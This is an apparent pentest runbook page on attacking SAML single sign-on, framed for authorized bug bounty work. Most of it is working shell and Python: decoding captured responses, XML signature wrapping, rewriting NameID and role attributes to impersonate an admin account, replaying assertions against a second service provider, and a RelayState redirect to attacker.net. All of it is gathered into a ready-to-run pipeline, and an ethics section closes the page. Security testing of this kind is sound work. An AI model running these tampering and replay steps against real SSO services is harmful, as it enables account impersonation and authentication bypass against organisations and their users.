---
title: "SAML Attacks"
description: "Attacking SAML SSO through signature wrapping, assertion tampering, and audience/recipient confusion to impersonate users."
phase: Web
order: 71
tags:
  - saml
  - sso
  - authentication
  - xml
tools:
  - saml-raider
  - xmllint
  - curl
updated: 2026-10-01
---

A SAML attack runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: forge or replay an assertion the SP accepts as a trusted identity via signature-wrapping or validation gaps, proving impersonation of an account you control.

## 1. Capture and decode the flow

```bash
echo "$SAML_B64" | base64 -d | xmllint --format - > response.xml
xmllint --format response.xml | less
```

Trace: SP → IdP `SAMLRequest`, IdP → SP `SAMLResponse`, then signature validation and `NameID`/attribute reads. The response passes through your browser, so it is tamperable.

## 2. Load into SAML Raider

```bash
curl -s -x http://127.0.0.1:8080 -X POST "https://target.com/saml/acs" \
  --data-urlencode "SAMLResponse=$SAML_B64"
```

In SAML Raider, note the signature scope (response vs assertion), the canonicalization, and the signed reference `ID`.

## 3. XML signature wrapping (XSW)

Keep the valid signature while making a forged assertion the one consumed.

```bash
cp response.xml xsw.xml
python3 - <<'PY'
x = open("xsw.xml").read()
x = x.replace("<saml:Assertion", "<saml:Assertion Foo=\"orig\"", 1)
open("xsw.xml","w").write(x)
PY
# move the signed assertion into an unused element and add your NameID as the processed one
base64 -w0 xsw.xml
```

Try namespace/`ID` vs `wsu:Id` confusion and duplicate elements.

## 4. Assertion tampering on unsigned fields

```bash
python3 - <<'PY'
x = open("response.xml").read()
x = x.replace("user@test.com", "admin@target.com")
x = x.replace("<saml:AttributeValue>user</saml:AttributeValue>",
              "<saml:AttributeValue>admin</saml:AttributeValue>")
open("tampered.xml","w").write(x)
PY
base64 -w0 tampered.xml > tampered.b64
```

## 5. Comment, audience, and recipient tests

```bash
# Replay a response meant for SP A against SP B
curl -s -X POST "https://target-b.com/saml/acs" \
  --data-urlencode "SAMLResponse=$SAML_B64" -i

# RelayState open redirect
curl -s -X POST "https://target.com/saml/acs" \
  --data-urlencode "SAMLResponse=$SAML_B64" \
  --data-urlencode "RelayState=https://attacker.net" -i
```

Also test comment confusion in `NameID` and IdP-initiated flows with no `InResponseTo`.

## Full pipeline

```bash
B="https://target.com"
echo "$SAML_B64" | base64 -d | xmllint --format - > response.xml
curl -s -x http://127.0.0.1:8080 -X POST "$B/saml/acs" \
  --data-urlencode "SAMLResponse=$SAML_B64" -i
python3 - <<'PY'
x = open("response.xml").read()
x = x.replace("user@test.com", "admin@target.com")
open("tampered.xml","w").write(x)
PY
base64 -w0 tampered.xml > tampered.b64
curl -s -X POST "$B/saml/acs" --data-urlencode "SAMLResponse@tampered.b64" -i
curl -s -X POST "https://target-b.com/saml/acs" \
  --data-urlencode "SAMLResponse=$SAML_B64" -i
curl -s -X POST "$B/saml/acs" --data-urlencode "SAMLResponse=$SAML_B64" \
  --data-urlencode "RelayState=https://attacker.net" -i
```

## Ethics & legality

- Only impersonate accounts you own or are explicitly authorized to test.
- Never tamper with or replay another real user's assertion.
- Keep SAML Raider and Burp logging enabled so every mutation is recorded.
- Report validation gaps (missing audience/recipient/signature-scope checks) with the exact transcript.
